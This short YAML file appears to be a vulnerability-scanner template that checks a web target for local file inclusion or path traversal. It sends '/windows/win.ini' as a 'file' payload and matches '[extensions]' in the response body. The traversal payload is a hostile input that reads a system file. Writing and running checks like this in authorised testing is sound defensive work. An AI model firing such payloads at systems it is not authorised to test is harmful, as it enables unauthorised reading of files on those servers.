id: lfi6-1176
name: 'Traversal in file'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via file'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      file:
        - '/windows/win.ini'
    matchers:
      - type: word
        part: body
        words:
          - '[extensions]'
